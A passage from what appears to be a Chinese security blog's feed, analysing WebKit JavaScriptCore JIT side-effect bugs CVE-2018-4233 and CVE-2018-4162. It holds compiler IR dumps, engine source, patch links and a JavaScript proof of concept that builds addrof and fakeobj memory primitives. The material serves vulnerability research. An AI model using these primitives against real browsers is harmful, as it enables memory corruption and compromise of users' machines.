Array, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">30:&lt;!0:-&gt; Check(MustGen, bc<span class="comment">#15, ExitValid)</span></span><br><span class="line">31:&lt; 1:-&gt; JSConstant(JS|PureNum|UseAsOther|UseAsInt|ReallyWantsInt, BoolInt32, Int32: 0, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">32:&lt;!0:-&gt; GetLocal(Untyped:@2, JS|MustGen|UseAsOther, NonIntAsdouble, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), bc<span class="comment">#17, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">38:&lt;!0:-&gt; Check(MustGen, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">39:&lt; 1:-&gt; GetButterfly(Cell:@42, Storage|PureInt, R:JSObject_butterfly, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">40:&lt; 1:-&gt; DoubleRep(Check:RealNumber:@32, Double|PureInt, BytecodeDouble, Exits, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">33:&lt;!0:-&gt; PutByVal(KnownCell:@42, Int32:@31, DoubleRepReal:@40&lt;Double&gt;, Untyped:@39, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line">34:&lt;!0:-&gt; Return(Untyped:@26, MustGen, W:SideState, Exits, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">35:&lt;!0:-&gt; Flush(Check:Untyped:@2, MustGen|IsFlushed, arg2(C~&lt;Double&gt;/FlushedJSValue), R:Stack(7), W:SideState, bc<span class="comment">#22, ExitValid) predicting NonIntAsdouble</span></span><br><span class="line">36:&lt;!0:-&gt; Flush(Check:Untyped:@1, MustGen|IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), R:Stack(6), W:SideState, bc<span class="comment">#22, ExitValid) predicting Array</span></span><br><span class="line">37:&lt;!0:-&gt; Check(MustGen, bc<span class="comment">#22, ExitValid)</span></span><br><span class="line">States: InvalidBranchDirection, StructuresAreWatched, CFAInvalidated</span><br><span class="line">Vars After:</span><br><span class="line">Var Links: arg2:@32 arg1:@42 arg0:@28 loc0:@5 loc1:@7 loc2:@9 loc3:@19 loc4:@21 loc5:@25</span><br><span class="line"></span><br><span class="line">GC Values:</span><br><span class="line">Weak:Object: 0x10000e4000 with butterfly 0x0 (Structure %Bl:JSLexicalEnvironment), StructureID: 73</span><br><span class="line">Weak:Object: 0x11cd74000 with butterfly 0x10000fe668 (Structure %En:Function), StructureID: 290</span><br><span class="line">Desired watchpoints:</span><br><span class="line">Watchpoint sets:</span><br><span class="line">Inline watchpoint sets: 0x11cdf3080, 0x11cdf1fe0, 0x11cdf0060, 0x11cdf27c0, 0x11cdf0760, 0x11cd701b0, 0x11cdf01b0</span><br><span class="line">Inferred values: 0x11cdd8f00</span><br><span class="line">Buffer views:</span><br><span class="line">Object property conditions:</span><br><span class="line">Inferred types:</span><br><span class="line">Structures:</span><br><span class="line">%Bl:JSLexicalEnvironment = 0x11cdf1f80:[JSLexicalEnvironment, &#123;&#125;, NonArray, Leaf]</span><br><span class="line">%Dy:Array = 0x11cdf2760:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x11cdb4090, Leaf]</span><br><span class="line">%En:Function = 0x11cd70150:[Function, &#123;prototype:100&#125;, NonArray, Proto:0x11cdd0000, Leaf]</span><br></pre></td></tr></table></figure><p>可以发现，GetButterfly之前的CheckStructure在常量折叠过程被优化掉了；对比clobberWorld版本，GetButterfly之前的CheckStructure仍保留。因此clobberWorld最终影响了constant folding phase。</p><p>跟踪constant folding phase，第187行的node-&gt;remove(m_graph)直接导致CheckStructure从IR的控制流图中被删除：</p><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102151417012-6413257.png" alt="image-20190102151417012"></p><p>进入if结构需要满足185行的if表达式为真，那么value.m_structure.isSubsetOf(set)就很重要了。</p><p>重新调试，为了找到对clobberWorld的调用，在DFG::AbstractInterpreterInlines.h的executeEffects函数case CreateThis选项下断点。发现停在了CFA phase(Control Flow Analysis)阶段，而这几个phase的顺序是：</p><p>invalidationpoint injection -&gt; structure check hoisting -&gt; strength reduction -&gt; cps rethreading -&gt; cfa -&gt; constant folding</p><p>executeEffects是在CFA阶段内发生的，那么CFA之前的阶段不需要关注。</p><p>跟进clobberWorld，在多层的调用中，有对m_set.setReservedFlag的赋值：</p><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102152930069-6414170.png" alt="image-20190102152930069"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uintptr_t</span> reservedFlag = <span class="number">2</span>;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setReservedFlag</span><span class="params">(<span class="keyword">bool</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value)</span><br><span class="line">    m_pointer |= reservedFlag;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">      m_pointer &amp;= ~reservedFlag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，在constant folding phase：</p><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102153202255-6414322.png" alt="image-20190102153202255"></p><p>跟进value.m_structure.isSubsetof(set)：</p><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102153329999-6414410.png" alt="image-20190102153329999"></p><p>由此解决了clobberWorld在AbstractInterpreter的前后呼应问题。</p><h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h3><p>CVE-2018-4233可以总结为CreateThis side effect导致的类型混淆漏洞，补丁修改了两处位置，AbstractInterpreter、Clobberize，这两处的任意一个均可以使PoC失效。相比2017年Moblie Pwn2Own中Vulcan团队使用的GetPropertyEnumerator/HasGenericProperty side effect漏洞的补丁，这个补丁更加全面地展示了这个漏洞的模式和面貌。挖掘出这种类型的漏洞，只需要两步：</p><ul><li>寻找具有回调特性的DFG IR</li><li>寻找DFG IR的模型问题</li></ul><p>然后就可以尝试构造漏洞了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h3&gt;&lt;p&gt;CVE-2018-4233是Pwn2Own 2018上Samuel Groß团队用来攻破Safari浏览器的漏洞。这是一个J
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-4162 CompareEq side effect</title>
    <link href="https://dwfault.github.io/2019/12/20/CVE-2018-4162%20CompareEq%20side%20effect/"/>
    <id>https://dwfault.github.io/2019/12/20/CVE-2018-4162 CompareEq side effect/</id>
    <published>2019-12-20T04:13:28.641Z</published>
    <updated>2019-12-20T04:13:28.641Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、从ZDI文章开始"><a href="#一、从ZDI文章开始" class="headerlink" title="一、从ZDI文章开始"></a>一、从ZDI文章开始</h3><p>2018年4月，ZDI发表了《INVERTING YOUR ASSUMPTIONS: A GUIDE TO JIT COMPARISONS》，描述了JavaScriptCore DFG JIT中CompareEq IR的副作用问题。通过TenSec2018的ppt，可以知道这个漏洞编号为CVE-2018-4162。</p><p>从文章给出的补丁上看，这显然是一个副作用问题：</p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119120611015.png" alt="image-20190119120611015"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveFakeObj</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    arr[<span class="string">'a'</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> go = <span class="function"><span class="keyword">function</span> (<span class="params">a, c</span>) </span>&#123;</span><br><span class="line">        a[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">        a[<span class="number">1</span>] = <span class="number">2.2</span>;</span><br><span class="line">        c == <span class="number">1</span>;</span><br><span class="line">        a[<span class="number">2</span>] = addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        go(arr, &#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    go(arr, &#123; <span class="attr">toString</span>: <span class="function"><span class="params">()</span> =&gt;</span> &#123; arr[<span class="number">0</span>] = &#123;&#125;; <span class="keyword">return</span> <span class="string">'1'</span>; &#125; &#125;);</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> addr = <span class="number">5.607070584648226e-310</span>;</span><br><span class="line"><span class="keyword">let</span> fakeObj = primitiveFakeObj(addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveAddrOf</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    arr[<span class="string">'a'</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> go = <span class="function"><span class="keyword">function</span> (<span class="params">a, c</span>) </span>&#123;</span><br><span class="line">        a[<span class="number">1</span>] = <span class="number">2.2</span>;</span><br><span class="line">        c == <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        go(arr, &#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> go(arr, &#123; <span class="attr">toString</span>: <span class="function"><span class="params">()</span> =&gt;</span> &#123; arr[<span class="number">0</span>] = obj; <span class="keyword">return</span> <span class="string">'1'</span>; &#125; &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> addrOfO = primitiveAddrOf(o);</span><br><span class="line">print(addrOfO);</span><br></pre></td></tr></table></figure><p>c == 1会触发一些回调，回调的内容就是{toString: () =&gt; { arr[0] = {}; return ‘1’; }}这个对象的toString函数。本次DFG代码中的回调调用了baseline JIT中的operationCompareEq：</p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119121032215.png" alt="image-20190119121032215"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v1 = object</span></span><br><span class="line"><span class="comment">// v2 = 0xffff000000000001</span></span><br><span class="line">ALWAYS_INLINE <span class="keyword">bool</span> JSValue::equalSlowCaseInline(ExecState* exec, JSValue v1, JSValue v2)</span><br><span class="line">&#123;</span><br><span class="line">    VM&amp; vm = exec-&gt;vm();</span><br><span class="line">    <span class="keyword">auto</span> scope = DECLARE_THROW_SCOPE(vm);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (v1.isNumber() &amp;&amp; v2.isNumber())</span><br><span class="line">            <span class="keyword">return</span> v1.asNumber() == v2.asNumber();</span><br><span class="line">        <span class="keyword">bool</span> s1 = v1.isString();                                  <span class="comment">//(1) false    (5) true</span></span><br><span class="line">        <span class="keyword">bool</span> s2 = v2.isString();                                  <span class="comment">//(2) false    (6) false    </span></span><br><span class="line">        <span class="keyword">if</span> (s1 &amp;&amp; s2) &#123;</span><br><span class="line">            scope.release();</span><br><span class="line">            <span class="keyword">return</span> asString(v1)-&gt;equal(exec, asString(v2));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v1.isUndefinedOrNull()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v2.isUndefinedOrNull())</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (!v2.isCell())</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> v2.asCell()-&gt;structure(vm)-&gt;masqueradesAsUndefined(exec-&gt;lexicalGlobalObject());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v2.isUndefinedOrNull()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!v1.isCell())</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> v1.asCell()-&gt;structure(vm)-&gt;masqueradesAsUndefined(exec-&gt;lexicalGlobalObject());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v1.isObject()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v2.isObject())</span><br><span class="line">                <span class="keyword">return</span> v1 == v2;</span><br><span class="line">            JSValue p1 = v1.toPrimitive(exec);                    <span class="comment">//(3) p1 object-&gt;string   =================&gt;</span></span><br><span class="line">            RETURN_IF_EXCEPTION(scope, <span class="literal">false</span>);</span><br><span class="line">            v1 = p1;                                              <span class="comment">//(4) v1 = p1;</span></span><br><span class="line">            <span class="keyword">if</span> (v1.isInt32() &amp;&amp; v2.isInt32())</span><br><span class="line">                <span class="keyword">return</span> v1 == v2;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v2.isObject()) &#123;</span><br><span class="line">            JSValue p2 = v2.toPrimitive(exec);</span><br><span class="line">            RETURN_IF_EXCEPTION(scope, <span class="literal">false</span>);</span><br><span class="line">            v2 = p2;</span><br><span class="line">            <span class="keyword">if</span> (v1.isInt32() &amp;&amp; v2.isInt32())</span><br><span class="line">                <span class="keyword">return</span> v1 == v2;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">bool</span> sym1 = v1.isSymbol();</span><br><span class="line">        <span class="keyword">bool</span> sym2 = v2.isSymbol();</span><br><span class="line">        <span class="keyword">if</span> (sym1 || sym2) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sym1 &amp;&amp; sym2)</span><br><span class="line">                <span class="keyword">return</span> asSymbol(v1) == asSymbol(v2);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (s1 || s2) &#123;</span><br><span class="line">            <span class="keyword">double</span> d1 = v1.toNumber(exec);                        <span class="comment">//(7) string -&gt; number</span></span><br><span class="line">            RETURN_IF_EXCEPTION(scope, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">double</span> d2 = v2.toNumber(exec);</span><br><span class="line">            RETURN_IF_EXCEPTION(scope, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">return</span> d1 == d2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v1.isBoolean()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v2.isNumber())</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(v1.asBoolean()) == v2.asNumber();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v2.isBoolean()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v1.isNumber())</span><br><span class="line">                <span class="keyword">return</span> v1.asNumber() == <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(v2.asBoolean());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v1 == v2;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119121221474.png" alt="image-20190119121221474"></p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119121323061.png" alt="image-20190119121323061"></p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119121402682.png" alt="image-20190119121402682"></p><p>…</p><p>从此以后，go(arr, {})、go(arr, {toString: () =&gt; { arr[0] = {}; return ‘1’; }})将会走向不同的地方。前者会走向objectProtoFuncValueOf，后者会走向其定义的toString函数。</p><p>实际调试发现，除了DFGAbstractInterpreter的clobberWorld之外，还会插入InvalidationPoint，那么也与DFGClobberize有关了。该版本下CompareEq是这样的：</p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119121954847.png" alt="image-20190119121954847"></p><p>其中isBinaryUseKind意思就是isBothUseKind，而根据PoC，DFG生成的代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31:&lt;!1:loc8&gt;  CompareEq(Untyped:@30, Untyped:@27, Boolean|MustGen|PureInt, Bool, R:World, W:Heap, Exits, ClobbersExit, bc<span class="comment">#17, ExitValid)</span></span><br></pre></td></tr></table></figure><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119122655078.png" alt="image-20190119122655078"></p><p>会插入InvalidationPoint和Jump replacement，显然无法复现。</p><h3 id="二、补丁寻找"><a href="#二、补丁寻找" class="headerlink" title="二、补丁寻找"></a>二、补丁寻找</h3><p>翻近一年多的commit，看到关于CompareEq有这么几处补丁：</p><p><a href="https://github.com/WebKit/webkit/commit/130b72921adb81d5dee000e7d62c90a48fb49839#diff-1a4598cdaa4bf5e3b8f84e8b3d7d037e" target="_blank" rel="noopener">https://github.com/WebKit/webkit/commit/130b72921adb81d5dee000e7d62c90a48fb49839#diff-1a4598cdaa4bf5e3b8f84e8b3d7d037e</a></p><p><a href="https://github.com/WebKit/webkit/commit/b6b0023ff9a7a327bcbd6c1badaaea459d650235" target="_blank" rel="noopener">https://github.com/WebKit/webkit/commit/b6b0023ff9a7a327bcbd6c1badaaea459d650235</a></p><p><a href="https://github.com/WebKit/webkit/commit/d06215ef926d61a9fdbd42da2ef2b3938957afde#diff-a8c2f873ebf995282afc8bd7f1c252de" target="_blank" rel="noopener">https://github.com/WebKit/webkit/commit/d06215ef926d61a9fdbd42da2ef2b3938957afde#diff-a8c2f873ebf995282afc8bd7f1c252de</a></p><p>其中后两个修来修去没啥实际效果(后文提到)，第一个是符合ZDI文章的补丁：</p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119120611015.png" alt="image-20190119120611015"></p><p>参考CVE-2018-4233，这个补丁导致的结果是CheckStructure/CheckArray等。究竟能不能利用，必须要求Invalidation不插入，也就是Clobberize定义出问题。但是在这个版本以及往前很多的版本下，DFGClobberize定义的CompareEq仍然是这样的：</p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119121954847.png" alt="image-20190119121954847"></p><p>于情于理，确实无法复现。</p><p>好在有同事在某不知名版本上复现了这个漏洞，反编译结果大概形如：</p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119131506076.png" alt="image-20190119131506076"></p><p>那么与之接近的源码应该为：</p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119131549752.png" alt="image-20190119131549752"></p><p>虽然仍然找不到具体哪个版本用了这样的代码，但漏洞终于可以复现了。</p><h3 id="三、成因分析"><a href="#三、成因分析" class="headerlink" title="三、成因分析"></a>三、成因分析</h3><h4 id="3-1-CompareEq的UseKind决定机器码内容"><a href="#3-1-CompareEq的UseKind决定机器码内容" class="headerlink" title="3.1 CompareEq的UseKind决定机器码内容"></a>3.1 CompareEq的UseKind决定机器码内容</h4><p>不管是DFGAbstractInterpreter还是DFGClobberize，出现问题的原因涉及CompareEq的children的UseKind。根据child1、child2的useKind，DFG在生成CompareEq的IR结点时，会有类似：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">31:&lt;!1:loc8&gt;  CompareEq(Untyped:@30, Untyped:@27, Boolean|MustGen|PureInt, Bool, R:World, W:Heap, Exits, ClobbersExit, bc<span class="comment">#17, ExitValid)</span></span><br><span class="line"></span><br><span class="line">39:&lt; 1:loc7&gt;  CompareEq(Check:Object:@38, Object:@35, Boolean|PureInt, Bool, Exits, bc<span class="comment">#32, ExitValid)</span></span><br><span class="line"></span><br><span class="line">39:&lt; 1:loc7&gt;CompareEq(Check:StringIdent:@38, StringIdent:@35, Boolean|PureInt, Bool, Exits, bc<span class="comment">#32, ExitValid)</span></span><br></pre></td></tr></table></figure><p>其中Untyped、Object对应两种UseKind。根据CompareEq的UseKind，会生成不同的机器码：</p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119132651178.png" alt="image-20190119132651178"></p><p><img src="CVE-2018-4162 CompareEq side effect.assets/image-20190119132712043.png" alt="image-20190119132712043"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> SpeculativeJIT::compilePeepHoleBranch(Node* node, MacroAssembler::RelationalCondition condition, MacroAssembler::DoubleCondition doubleCondition, S_JITOperation_EJJ operation)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Fused compare &amp; branch.</span></span><br><span class="line">    <span class="keyword">unsigned</span> branchIndexInBlock = detectPeepHoleBranch();</span><br><span class="line">    <span class="keyword">if</span> (branchIndexInBlock != UINT_MAX) &#123;</span><br><span class="line">        Node* branchNode = m_block-&gt;at(branchIndexInBlock);</span><br><span class="line">        <span class="comment">// detectPeepHoleBranch currently only permits the branch to be the very next node,</span></span><br><span class="line">        <span class="comment">// so can be no intervening nodes to also reference the compare.</span></span><br><span class="line">        ASSERT(node-&gt;adjustedRefCount() == <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;isBinaryUseKind(Int32Use))</span><br><span class="line">            compilePeepHoleInt32Branch(node, branchNode, condition);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE(JSVALUE64)</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;isBinaryUseKind(Int52RepUse))</span><br><span class="line">            compilePeepHoleInt52Branch(node, branchNode, condition);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// USE(JSVALUE64)</span></span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;isBinaryUseKind(StringUse) || node-&gt;isBinaryUseKind(StringIdentUse)) &#123;</span><br><span class="line">            <span class="comment">// Use non-peephole comparison, for now.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;isBinaryUseKind(DoubleRepUse))</span><br><span class="line">            compilePeepHoleDoubleBranch(node, branchNode, doubleCondition);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;op() == CompareEq) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;isBinaryUseKind(BooleanUse))</span><br><span class="line">                compilePeepHoleBooleanBranch(node, branchNode, condition);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;isBinaryUseKind(SymbolUse))</span><br><span class="line">                compilePeepHoleSymbolEquality(node, branchNode);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;isBinaryUseKind(ObjectUse))</span><br><span class="line">                compilePeepHoleObjectEquality(node, branchNode);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;isBinaryUseKind(ObjectUse, ObjectOrOtherUse))</span><br><span class="line">                compilePeepHoleObjectToObjectOrOtherEquality(node-&gt;child1(), node-&gt;child2(), branchNode);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;isBinaryUseKind(ObjectOrOtherUse, ObjectUse))</span><br><span class="line">                compilePeepHoleObjectToObjectOrOtherEquality(node-&gt;child2(), node-&gt;child1(), branchNode);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (!needsTypeCheck(node-&gt;child1(), SpecOther))</span><br><span class="line">                nonSpeculativePeepholeBranchNullOrUndefined(node-&gt;child2(), branchNode);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (!needsTypeCheck(node-&gt;child2(), SpecOther))</span><br><span class="line">                nonSpeculativePeepholeBranchNullOrUndefined(node-&gt;child1(), branchNode);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                nonSpeculativePeepholeBranch(node, branchNode, condition, operation); <span class="comment">//===================&gt;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>可以把PoC改一下，针对性地修改UseKind，可以看到UseKind为Object、StringIdent时，生成的机器码不含有回调的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ObjectUse -- no callback</span></span><br><span class="line"><span class="comment">//39:&lt; 1:loc7&gt;  CompareEq(Check:Object:@38, Object:@35, Boolean|PureInt, Bool, Exits, bc#32, ExitValid)</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">arr[<span class="string">'a'</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> o = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> go = <span class="function"><span class="keyword">function</span> (<span class="params">a, c</span>) </span>&#123;</span><br><span class="line">    a[<span class="number">0</span>] = <span 